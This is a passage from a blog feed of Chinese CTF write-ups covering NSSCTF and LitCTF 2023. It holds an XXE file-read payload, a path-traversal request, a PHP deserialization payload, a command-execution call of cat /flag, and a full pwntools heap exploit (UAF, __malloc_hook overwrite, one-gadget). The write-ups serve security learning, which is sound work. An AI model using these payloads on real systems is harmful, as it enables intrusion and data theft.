参数，使用了一个文件，每猜错应该是文件包含漏洞，无脑梭哈一个 POST ： theme=…/…/…/…/flag</p>\n<p>​\t最后得到 flag。</p>\n<h2 id=\"5-exx\"><a class=\"markdownIt-Anchor\" href=\"#5-exx\">#</a> 5、exx</h2>\n<p>​\t看题目应该是 xxe 漏洞，搞文件包含的，直接本地文件包含，基础 xxe，无任何过滤，且本地包含：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">data</span> [</span></span><br><span class=\"line\"><span class=\"meta\">  <span class=\"meta\">&lt;!ENTITY <span class=\"keyword\">xxe</span> <span class=\"keyword\">SYSTEM</span> <span class=\"string\">&quot;php://filter/resource=/flag&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span></span><br><span class=\"line\"><span class=\"symbol\">&amp;xxe;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">password</span>&gt;</span>123456<span class=\"tag\">&lt;/<span class=\"name\">password</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t最后拿到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NSSCTF&#123;0bc65b57-3d0c-43e4-ae32-fcd9276f430b&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"6-sas-serializing-authentication\"><a class=\"markdownIt-Anchor\" href=\"#6-sas-serializing-authentication\">#</a> 6、SAS - Serializing Authentication</h2>\n<p>​\t给了源码:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>, <span class=\"variable\">$password</span></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isValid</span>(<span class=\"params\"></span>) </span>&#123; <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;username === <span class=\"string\">&#x27;admin&#x27;</span> &amp;&amp; <span class=\"variable language_\">$this</span>-&gt;password === <span class=\"string\">&#x27;secure_password&#x27;</span>; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t大概推测是让 isValid 这个方法为真，那么，这个就简单了，提示挺明显的，有个 base64 解码，那么构造如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">User</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>, <span class=\"variable\">$password</span></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isValid</span>(<span class=\"params\"></span>) </span>&#123; <span class=\"keyword\">return</span> <span class=\"variable language_\">$this</span>-&gt;username === <span class=\"string\">&#x27;admin&#x27;</span> &amp;&amp; <span class=\"variable language_\">$this</span>-&gt;password === <span class=\"string\">&#x27;secure_password&#x27;</span>; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">User</span>(<span class=\"string\">&#x27;admin&#x27;</span>,<span class=\"string\">&#x27;secure_password&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiJzZWN1cmVfcGFzc3dvcmQiO30=</span><br></pre></td></tr></table></figure>\n<p>​\tflag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;deserialization_vulnerability&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> Pwn：</h1>\n<h2 id=\"1-heap-223\"><a class=\"markdownIt-Anchor\" href=\"#1-heap-223\">#</a> 1、heap-2.23</h2>\n<p>​\t先查看架构和保护：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@MSI:/mnt/c/Users/20820/Downloads/pwn# checksec pwn</span><br><span class=\"line\">[*] &#x27;/mnt/c/Users/20820/Downloads/pwn/pwn&#x27;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>​\t开启了栈不可执行和栈溢出保护，那么，扔 IDA 里看看：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __fastcall __noreturn <span class=\"title function_\">main</span><span class=\"params\">(__int64 a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v4; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  sub_400866(a1, a2, a3);</span><br><span class=\"line\">  v3 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    sub_4008B3();</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v3);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ( v3 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        sub_4008FB();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">        sub_400A0B();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">        sub_400AAB();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">        sub_400B55();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">5</span>:</span><br><span class=\"line\">        sub_400C15();</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;error!&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\tmain 函数感觉很眼熟，不管了，找到了个似乎可以利用的函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">sub_400A0B</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v0; <span class=\"comment\">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v1; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v0 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;idx? &quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v0);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v0 &lt;= <span class=\"number\">0xF</span> &amp;&amp; *(&amp;ptr + (<span class=\"type\">int</span>)v0) )</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*(&amp;ptr + (<span class=\"type\">int</span>)v0));</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;no such chunk!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t由于在 free 掉一个 chunk 之后没有对其指针进行置零，所以这里可能产生了 UAF，果然，我太菜了，最简单的 UAF 都看不懂，跟着大佬看看算了，根据大佬们的 wp，似乎是通过泄露__malloc_hook 的地址，然后根据动态链接库文件算偏移，拿到 /bin/sh 等的地址，具体原理之后再看，先了解下这是个啥东西，咋操作的，直接贴一个大佬的 exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">filename = <span class=\"string\">&#x27;./heap&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">debug = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> debug :</span><br><span class=\"line\">    io = remote(<span class=\"string\">&#x27;node2.anna.nssctf.cn&#x27;</span>, <span class=\"number\">28352</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    io = process(filename)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(filename)</span><br><span class=\"line\"></span><br><span class=\"line\">context(arch = elf.arch, log_level = <span class=\"string\">&#x27;debug&#x27;</span>, os = <span class=\"string\">&#x27;linux&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dbg</span>():</span><br><span class=\"line\">\tgdb.attach(io)</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">index, size</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&#x27;&gt;&gt;&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&#x27;idx? &#x27;</span>, <span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&#x27;size? &#x27;</span>, <span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&#x27;&gt;&gt;&#x27;</span>, <span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&#x27;idx? &#x27;</span>, <span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&#x27;&gt;&gt;&#x27;</span>, <span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&#x27;idx? &#x27;</span>, <span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">index, content</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&#x27;&gt;&gt;&#x27;</span>, <span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&#x27;idx? &#x27;</span>, <span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">&#x27;content : &#x27;</span>, content)</span><br><span class=\"line\">\t</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"number\">0x60</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&#x27;content : &#x27;</span>)</span><br><span class=\"line\">__malloc_hook = u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>, <span class=\"string\">b&#x27;\\0&#x27;</span>)) - <span class=\"number\">0x68</span></span><br><span class=\"line\">success(<span class=\"string\">&#x27;__malloc_hook =&gt;&gt; &#x27;</span> + <span class=\"built_in\">hex</span>(__malloc_hook))</span><br><span class=\"line\">libcbase = __malloc_hook - libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">onegadget = libcbase + <span class=\"number\">0xf1247</span></span><br><span class=\"line\"></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>, p64(__malloc_hook - <span class=\"number\">0x23</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">2</span>, <span class=\"number\">0x60</span>)</span><br><span class=\"line\">add(<span class=\"number\">3</span>, <span class=\"number\">0x60</span>)</span><br><span class=\"line\">edit(<span class=\"number\">3</span>, <span class=\"string\">b&#x27;A&#x27;</span> * <span class=\"number\">0x13</span> + p64(onegadget))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">4</span>, <span class=\"number\">0x60</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Game"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/a929fb97.html",
            "url": "http://blog.g01den.top/posts/a929fb97.html",
            "title": "【2023】LitCTF",
            "date_published": "2024-06-05T11:39:33.000Z",
            "content_html": "<h1 id=\"litctf2023复现\"><a class=\"markdownIt-Anchor\" href=\"#litctf2023复现\">#</a> LitCTF2023（复现）</h1>\n<h1 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> Web：</h1>\n<h2 id=\"1-我flag呢\"><a class=\"markdownIt-Anchor\" href=\"#1-我flag呢\">#</a> 1、我 Flag 呢？</h2>\n<p>​\tctrl+u 读取源码，在最后发现了 flag：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!--flag is here flag=NSSCTF&#123;3d5218b9-4e24-4d61-9c15-68f8789e8c48&#125; --&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"2-php是世界上最好的语言\"><a class=\"markdownIt-Anchor\" href=\"#2-php是世界上最好的语言\">#</a> 2、PHP 是世界上最好的语言！！</h2>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/47790a355a0b4aa1b229b67d2e9b6728.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>​\t右边那个框下面是 RUN CODE ，结合题目是 PHP，推测为 RCE，先输入 echo 123; 看看会发生啥：发现左边输出内容出现了 123，那么，直接 system (“cat /flag”); 成功拿到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag=NSSCTF&#123;b26d3851-52f5-4a80-9e69-6417baf49d68&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-导弹迷踪\"><a class=\"markdownIt-Anchor\" href=\"#3-导弹迷踪\">#</a> 3、导弹迷踪</h2>\n<p>​\tjs 游戏题，先看源码，这里看 game.js：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span 